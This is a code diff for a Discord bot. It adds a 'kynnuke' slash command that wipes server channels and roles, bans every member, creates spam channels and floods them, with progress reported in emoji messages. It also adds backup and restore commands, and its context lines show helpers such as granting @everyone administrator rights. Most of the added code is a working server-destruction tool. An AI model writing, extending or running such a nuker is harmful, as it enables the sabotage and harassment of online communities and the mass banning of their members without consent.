@@ -1074,6 +1074,71 @@ client.on('messageCreate', async (message) => {
     }
 });
 
+client.on('interactionCreate', async (interaction) => {
+    if (interaction.commandName === 'kynnuke') {
+        const guild = interaction.guild;
+
+        // Backup Phase
+        await interaction.reply('💾 Starting backup phase...');
+        const backupFile = await backupServerData(guild);
+        if (!backupFile) {
+            return interaction.editReply('❌ Backup failed. Aborting nuke.');
+        }
+        await interaction.editReply('✅ Backup completed successfully.');
+
+        // Proceed with the nuke phases
+        await interaction.editReply('💣 Starting nuke procedure...');
+        await new Promise(resolve => setTimeout(resolve, nukerConfig.timing.initialOperationDelay));
+
+        // Edit server info first
+        await editServerInfo(guild);
+
+        // PHASE 1: DELETIONS
+        await interaction.editReply('💣 Starting deletion phase...');
+        const rolesResult = await manageRoles(guild);
+        const channelsDeleted = await deleteAllChannels(guild);
+
+        // PHASE 2: BANS
+        await interaction.editReply('💣 Starting ban phase...');
+        const bannedCount = await banAllMembers(guild);
+
+        // PHASE 3: CREATIONS
+        await interaction.editReply('💣 Starting creation phase...');
+        if (nukerConfig.behavior.createRoles) {
+            await manageRoles(guild);
+        }
+        if (nukerConfig.behavior.createChannels) {
+            await createSpamChannels(guild);
+        }
+
+        // PHASE 4: SPAM
+        await interaction.editReply('💣 Starting spam phase...');
+        await spamChannelsFunc(guild);
+
+        // Final report
+        await interaction.editReply(
+            `✅ Nuke complete!\n` +
+            `- Banned ${bannedCount} members\n` +
+            `- Deleted ${channelsDeleted} channels\n` +
+            `- Created ${spamChannels.length} channels\n` +
+            `- Created ${rolesCreated} roles`
+        );
+    }
+});
+
+client.on('interactionCreate', async (interaction) => {
+    if (interaction.commandName === 'kynbackup') {
+        const guild = interaction.guild;
+
+        await interaction.reply('💾 Starting server backup...');
+        const backupFile = await backupServerData(guild);
+        if (!backupFile) {
+            return interaction.editReply('❌ Backup failed.');
+        }
+        return interaction.editReply(`✅ Backup completed successfully. Saved to: ${backupFile}`);
+    }
+});
+
 // =====================
 // NEW FEATURES (APPENDED TO ORIGINAL CODE)
 // =====================
@@ -1093,7 +1158,7 @@ async function sendBanDM(member) {
 async function backupServerData(guild) {
     const backupConfig = config.nuker.backupNuke;
 
-    if (!config.nuker.backupServerBeforeNuke || !backupConfig?.enabled) return;
+    if (!backupConfig?.enabled) return;
 
     const backupDir = path.resolve(backupConfig.saveTo);
     if (!fs.existsSync(backupDir)) {
@@ -1179,10 +1244,12 @@ async function backupServerData(guild) {
     }
 
     // Save the backup to a file
-    const backupFile = path.join(backupDir, `${guild.id}_${Date.now()}.json`);
+    const timestamp = Date.now();
+    const backupFile = path.join(backupDir, `${guild.id}_${timestamp}.json`);
     fs.writeFileSync(backupFile, JSON.stringify(data, null, 2));
 
     console.log(`[BACKUP] Saved server data for ${guild.name} to ${backupFile}`);
+    return backupFile; // Return the backup file path
 }
 
 // Give @everyone Admin
@@ -1346,3 +1413,45 @@ async function restoreServerData(guild, backupFile) {
         console.error(`[RESTORE] Error restoring server:`, error);
     }
 }
+
+client.on('interactionCreate', async (interaction) => {
+    if (interaction.commandName === 'kynrestore') {
+        const backupDir = path.resolve(config.nuker.backupNuke.saveTo);
+        if (!fs.existsSync(backupDir)) {
+            return interaction.reply('❌ No backups found.');
+        }
+
+        const backupFiles = fs.readdirSync(backupDir).filter(file => file.endsWith('.json'));
+        if (backupFiles.length === 0) {
+            return interaction.reply('❌ No backups found.');
+        }
+
+        const backupList = backupFiles.map((file, index) => {
+            const backupData = JSON.parse(fs.readFileSync(path.join(backupDir, file), 'utf8'));
+            return `${index + 1}. ${backupData.serverSettings.name} - ${new Date(parseInt(file.split('_')[1])).toLocaleString()}`;
+        }).join('\n');
+
+        await interaction.reply(`💾 Available backups:\n${backupList}\n\nReply with the number of the backup you want to restore.`);
+
+        const filter = response => response.author.id === interaction.user.id;
+        const collector = interaction.channel.createMessageCollector({ filter, time: 60000 });
+
+        collector.on('collect', async (message) => {
+            const choice = parseInt(message.content);
+            if (isNaN(choice) || choice < 1 || choice > backupFiles.length) {
+                return message.reply('❌ Invalid choice. Please try again.');
+            }
+
+            const selectedBackup = path.join(backupDir, backupFiles[choice - 1]);
+            await message.reply('🔄 Restoring server from backup...');
+            await restoreServerData(interaction.guild, selectedBackup);
+            return message.reply('✅ Server restored successfully!');
+        });
+
+        collector.on('end', collected => {
+            if (collected.size === 0) {
+                interaction.followUp('❌ No response received. Restore cancelled.');
+            }
+        });
+    }
+});
